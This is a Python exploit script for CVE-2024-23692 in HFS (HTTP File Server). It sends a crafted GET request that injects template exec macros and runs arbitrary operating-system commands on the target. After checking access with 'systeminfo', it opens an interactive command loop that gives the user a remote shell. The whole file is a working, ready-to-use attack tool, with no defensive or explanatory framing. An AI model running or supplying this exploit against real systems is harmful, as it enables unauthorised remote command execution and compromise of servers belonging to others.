import http.client
import chardet # type: ignore
import gzip
import sys
from urllib.parse import quote
from io import BytesIO



banner = """
*********************************************************************************
*                HFS OS Shell Support(HFS <= 2.3m or 2.4.0 RC7)                 *
*                          Based On CVE-2024-23692                              *
*                              Author: b0b@c                                    *   
*********************************************************************************
"""


def print_banner():
    print(banner)


def get_request(target: str, payload: str, header: dict):
    target_list = target.split(":")
    if len(target_list) == 3:
        protocol, target_address, target_port = target_list[0], target_list[1][2:], target_list[2]
        protocol = protocol
        target_port = int(target_port)
    elif len(target_list) == 2:
        protocol, target_address = target_list[0], target_list[1][2:]
        protocol = protocol
        target_port = 0
    else:
        raise Exception("Target Error!")
    connection = None
    try:
        if protocol == "https":
            target_port = 443 if target_port == 0 else target_port
            connection = http.client.HTTPSConnection(target_address, target_port)
        elif protocol == "http":
            target_port = 80 if target_port == 0 else target_port
            connection = http.client.HTTPConnection(target_address, target_port)
        else:
            raise Exception("Target URL Error!")
    except Exception as error:
        raise error

    connection.request('GET', payload, headers=header)
    response = connection.getresponse()
    return response


def decode_response(response):
    raw_content = None
    if response.getheader('Content-Encoding') == 'gzip':   
        compressed_data = response.read()
        response_data_bytes = BytesIO(compressed_data)
        raw_content = gzip.GzipFile(fileobj=response_data_bytes).read()
    else:
        raw_content = response.read()
    # 检测编码并解码
    if raw_content is None:
        return ""
    detected_encoding = chardet.detect(raw_content)['encoding']
    html_content = raw_content.decode(detected_encoding or 'utf-8', errors='replace')
    return html_content


def find_result(content, command):
    start_index = content.find("cmd=%s&search=" % command)
    end_index = content.find("====\n&tpl=list")
    if start_index == -1 or end_index == -1:
        return ""
    content = content[start_index:end_index]
    result = content.split("RESULT:")[1]
    result = result.strip()
    result = result.split(":&#37")[0]
    return result



def execute_command(target, command: str) -> None:
    payload: str = f'/?n=%0A&cmd={command}&search=%25xxx%25url%25:%password%}}{{.exec|{{.?cmd.}}|timeout=15|out=abc.}}{{.?n.}}{{.?n.}}RESULT:{{.?n.}}{{.^abc.}}===={{.?n.}}'
    header: dict = {
        'Host': '%s:80' % str(target.split(":")[1]),
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Upgrade-Insecure-Requests': '1'
    }
    html_content = None
    response = None
    try:
        response = get_request(target, payload, header)
    except Exception as error:
        print("[-] Error: %s" % str(error))
    if response is not None:
        html_content = decode_response(response)
    else:
        html_content = ""
    if html_content is not None and html_content != "":
        result = find_result(html_content, command)
    else:
        result = ""
    return result[0:-6]


def detect(target):
    print("[+] Try to get target shell!")
    try:
        result = execute_command(target, "systeminfo")
        if result.find("Microsoft Corporation") > 0:
            print("[+] Get shell succeed!")
    except Exception as error:
        print("[-] Get shell failed!")
        sys.exit(0)



def get_shell(target):
    target_string = target.split("://")[1].split(":")[0]
    while True:
        command = input("[%s]>>> " % target_string)
        if command == 'exit':
            sys.exit(0)
        command = quote(command, safe='/:?=&')
        print(execute_command(target, command))



if __name__ == "__main__":
   target = sys.argv[1]
   target = target [0:-1] if target[-1] == "/" else target
   print_banner()
   detect(target)
   get_shell(target)


